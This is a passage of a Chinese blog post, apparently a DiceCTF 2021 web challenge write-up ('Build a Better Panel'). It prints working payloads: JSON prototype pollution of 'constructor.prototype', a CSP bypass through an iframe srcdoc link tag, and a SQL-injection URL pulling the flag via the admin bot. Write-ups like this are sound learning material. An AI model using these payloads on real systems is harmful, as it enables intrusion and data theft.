+	<span style="color:#f92672">&#34;widgetData&#34;</span>: <span style="color:#e6db74">&#34;{\&#34;prototype\&#34;:{\&#34;onload\&#34;:\&#34;alert()\&#34;}}&#34;</span>
+}
+</code></pre></div><p>传给<code>/panel/add</code>接口，然后再去访问<code>/panel</code>，在控制台测试一下</p>
+<p><a href="https://imgchr.com/i/yBg6wn">
+        <a data-fancybox="gallery" href="https://s3.ax1x.com/2021/02/11/yBg6wn.png">
+            <img class="mx-auto" alt="yBg6wn.png" src="https://s3.ax1x.com/2021/02/11/yBg6wn.png" />
+        </a>
+    </a>
+可以看到确实成功实现了<code>Object.prototype.onload = 'alert(1)'</code>，但是并没有弹窗，因为还存在一个CSP的限制</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Security</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Policy</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">default</span><span style="color:#f92672">-</span><span style="color:#a6e22e">src</span> <span style="color:#e6db74">&#39;none&#39;</span>; <span style="color:#a6e22e">script</span><span style="color:#f92672">-</span><span style="color:#a6e22e">src</span> <span style="color:#e6db74">&#39;self&#39;</span> <span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//cdn.embedly.com/; style-src &#39;self&#39; http://cdn.embedly.com/; connect-src &#39;self&#39; https://www.reddit.com/comments/;
+</span></code></pre></div><p>Bypass CSP用到的是iframe的<code>srcdoc</code>属性，</p>
+<blockquote>
+<p>srcdoc 属性是一段HTML代码，这些代码会被渲染到 iframe 中。如果浏览器不支持 srcdoc 属性，则会渲染 src 属性表示的内容。</p>
+</blockquote>
+<p>但是还有一个问题，及时我们设置了iframe的srcdoc属性为javascript，仍然无法执行，这是因为<code>script-src:self</code>限制了我们只能执行同源脚本，</p>
+<p>但是我们可以利用<code>link</code>标签绕过,网址的payload跟上一个一样，因为注入点没改。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">stylesheet</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://build-a-better-panel.dicec.tf/admin/debug/add_widget?panelid=01603e38-9326-4a12-b499-9c1b78d653a6&#39;%2C%20(select%20flag%20from%20flag)%2C%20&#39;1&#39;)%3B--&amp;widgetname=1&amp;widgetdata=1&#34;</span>&gt;&lt;/<span style="color:#f92672">link</span>&gt;
+</code></pre></div><p>所以最终步骤是</p>
+<p>1.构造payload</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(
+    <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
+        <span style="color:#a6e22e">widgetName</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;constructor&#39;</span>,
+        <span style="color:#a6e22e">widgetData</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
+            <span style="color:#a6e22e">prototype</span><span style="color:#f92672">:</span> {
+                <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`&lt;link rel=stylesheet href=&#34;https://build-a-better-panel.dicec.tf/admin/debug/add_widget?panelid=3f72e2f3-9215-468d-a4fe-9b284a54115e&#39;%2C%20(select%20flag%20from%20flag)%2C%20&#39;1&#39;)%3B--&amp;widgetname=1&amp;widgetdata=1&#34;&gt;&lt;/link&gt;`</span>
+            }
+        })
+    }))
+
+<span style="color:#75715e">//{&#34;widgetName&#34;:&#34;constructor&#34;,&#34;widgetData&#34;:&#34;{\&#34;prototype\&#34;:{\&#34;srcdoc\&#34;:\&#34;&lt;link rel=stylesheet href=\\\&#34;https://build-a-better-panel.dicec.tf/admin/debug/add_widget?panelid=3f72e2f3-9215-468d-a4fe-9b284a54115e&#39;%2C%20(select%20flag%20from%20flag)%2C%20&#39;1&#39;)%3B--&amp;widgetname=1&amp;widgetdata=1\\\&#34;&gt;&lt;/link&gt;\&#34;}}&#34;}
+</span></code></pre></div><p>2.在<code>/panel/add</code>通过原型链污染，往srcdoc属性注入link的内容
+<a href="https://imgchr.com/i/yBRPu4">
+        <a data-fancybox="gallery" href="https://s3.ax1x.com/2021/02/11/yBRPu4.png">
+            <img class="mx-auto" alt="yBRPu4.png" src="https://s3.ax1x.com/2021/02/11/yBRPu4.png" />
+        </a>
+    </a>
+3.然后再用admin bot去访问对应的地址，注意这里利用<code>/create?debugid=xxx</code>带上自己cookie中的panelId即可
+<a href="https://imgchr.com/i/yBRQDH">
+        <a data-fancybox="gallery" href="https://s3.ax1x.com/2021/02/11/yBRQDH.png">
+            <img class="mx-auto" alt="yBRQDH.png" src="https://s3.ax1x.com/2021/02/11/yBRQDH.png" />
+        </a>
+    </a>
+4.回去<code>/panel</code>就可以看到flag了
+<a href="https://imgchr.com/i/yBR3VA">
+        <a data-fancybox="gallery" href="https://s3.ax1x.com/2021/02/11/yBR3VA.png">
+            <img class="mx-auto" alt="yBR3VA.png" src="https://s3.ax1x.com/2021/02/11/yBR3VA.png" />
+        </a>
+    </a></p>
+<h2 id="参考链接">参考链接</h2>
+<ol>
+<li><a href="https://github.com/aszx87410/ctf-writeups/issues/16">https://github.com/aszx87410/ctf-writeups/issues/16</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe">https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Spread_syntax">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Spread_syntax</a></li>
+<li><a href="https://blog.bi0s.in/2021/02/09/Web/DiceCTF21-WebIDE/">https://blog.bi0s.in/2021/02/09/Web/DiceCTF21-WebIDE/</a></li>
+<li><a href="https://blog.bi0s.in/2021/02/09/Web/BuildAbetterPanel-dice21/">https://blog.bi0s.in/2021/02/09/Web/BuildAbetterPanel-dice21/</a></li>
+</ol>
+
+        </div>
+
+        
+<div class="post-archive">
+    <ul class="post-copyright">
+        <li><strong>原文作者：</strong><a rel="author" href="http://segogt.github.io/">sakai</a></li>
+        <li style="word-break:break-all"><strong>原文链接：</strong><a href="http://segogt.github.io/post/%E8%AE%B0%E4%B8%80%E5%9C%BA%E7%BA%AFjs%E8%B5%9Bdicectf2020-web%E9%A2%98%E8%A7%A3/">http://segogt.github.io/post/%E8%AE%B0%E4%B8%80%E5%9C%BA%E7%BA%AFjs%E8%B5%9Bdicectf2020-web%E9%A2%98%E8%A7%A3/</a></li>
+        <li><strong>版权声明：</strong>本作品采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。</li>
+    </ul>
+</div>
+<br/>
+
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/post/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%8E%E5%8F%8D%E5%BC%B9shell/">文件描述符、重定向与反弹shell</a></li>
+        
+        <li><a href="/post/ubuntu18-04-%E7%BC%96%E8%AF%91glibc-2-23/">ubuntu18.04 编译glibc-2.23</a></li>
+        
+        <li><a href="/post/linux%E5%A0%86%E7%AC%94%E8%AE%B0-%E4%BA%8C-%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/">linux堆笔记(二)——堆相关的数据操作</a></li>
+        
+        <li><a href="/post/linux%E5%A0%86%E7%AC%94%E8%AE%B0-%E4%B8%80-%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">linux堆笔记(一)——堆相关的数据结构</a></li>
+        
+        <li><a href="/archives/">归档</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='/tags/ctf%E9%A2%98%E8%A7%A3'>ctf题解</a></li>
+                
+                <li><a href='/tags/nodejs'>nodejs</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+    <div class="post bg-white">
+      <script src="https://utteranc.es/client.js"
+            repo= "segogt/blog-comments"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+      </script>
+    </div>
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2021 <a href="http://segogt.github.io/">sakai&#39;s blog By sakai</a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script><script src="https://cdn.bootcdn.net/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='http://segogt.github.io/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="http://segogt.github.io/">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="http://segogt.github.io/post/nodejs%E4%B8%AD%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/" title="Nodejs中代码执行绕过的一些技巧">Nodejs中代码执行绕过的一些技巧</a>
+    </li>
+    
+    <li>
+        <a href="http://segogt.github.io/post/%E8%AE%B0%E4%B8%80%E5%9C%BA%E7%BA%AFjs%E8%B5%9Bdicectf2020-web%E9%A2%98%E8%A7%A3/" title="diceCTF2020 Web题解">diceCTF2020 Web题解</a>
+    </li>
+    
+    <li>
+        <a href="http://segogt.github.io/post/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%8E%E5%8F%8D%E5%BC%B9shell/" title="文件描述符、重定向与反弹shell">文件描述符、重定向与反弹shell</a>
+    </li>
+    
+    <li>
+        <a href="http://segogt.github.io/post/ubuntu18-04-%E7%BC%96%E8%AF%91glibc-2-23/" title="ubuntu18.04 编译glibc-2.23">ubuntu18.04 编译glibc-2.23</a>
+    </li>
+    
+    <li>
+        <a href="http://segogt.github.io/post/linux%E5%A0%86%E7%AC%94%E8%AE%B0-%E4%BA%8C-%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/" title="linux堆笔记(二)——堆相关的数据操作">linux堆笔记(二)——堆相关的数据操作</a>
+    </li>
+    
+    <li>
+        <a href="http://segogt.github.io/post/linux%E5%A0%86%E7%AC%94%E8%AE%B0-%E4%B8%80-%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="linux堆笔记(一)——堆相关的数据结构">linux堆笔记(一)——堆相关的数据结构</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href='/categories/'>分类</a></h3>
+<ul class="widget-list">
+    
+    <li><a href="http://segogt.github.io/categories/ctf/">ctf (4)</a></li>
+    
+    <li><a href="http://segogt.github.io/categories/pwn/">pwn (2)</a></li>
+    
+    <li><a href="http://segogt.github.io/categories/web/">web (2)</a></li>
+    
+    <li><a href="http://segogt.github.io/categories/%E6%99%AE%E9%80%9A%E7%9A%84linux%E7%9F%A5%E8%AF%86/">普通的linux知识 (2)</a></li>
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href='/tags/'>标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="http://segogt.github.io/tags/ctf%E9%A2%98%E8%A7%A3/">ctf题解</a>
+    
+    <a href="http://segogt.github.io/tags/linux/">linux</a>
+    
+    <a href="http://segogt.github.io/tags/nodejs/">nodejs</a>
+    
+    <a href="http://segogt.github.io/tags/%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%9B%B8%E5%85%B3/">内存分配相关</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="http://segogt.github.io/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
